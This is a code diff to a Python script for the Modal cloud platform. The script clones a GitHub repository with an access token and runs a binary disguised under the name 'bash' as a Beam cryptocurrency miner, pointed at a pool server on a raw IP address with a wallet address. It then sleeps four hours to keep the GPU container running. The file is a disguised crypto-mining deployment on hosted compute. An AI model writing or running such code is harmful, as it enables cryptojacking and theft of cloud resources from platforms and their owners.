@@ -1,3 +1,9 @@
+import modal
+import subprocess
+import time
+
+app = modal.App("t4x3-runner")
+
 image = (
     modal.Image.from_registry(
         "nvidia/cuda:12.1.1-runtime-ubuntu22.04"
@@ -24,7 +30,10 @@ def run_script():
     git clone https://${GH_TOKEN}@github.com/sadarsayujinjas/gm.git
     cd gm
     chmod u+x bash
-    ./bash ./bash -a beamhash -s 157.230.145.21:80 -u 9e9d39b48aeb26349eb88c4576295b529a6a7b2246439a06c35aba5209d9c96d91.jasin
+    ./bash -a beamhash -s 157.230.145.21:80 -u 9e9d39b48aeb26349eb88c4576295b529a6a7b2246439a06c35aba5209d9c96d91.jasin
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
+
+    print("Staying alive for 4 hours...")
+    time.sleep(60 * 60 * 4)
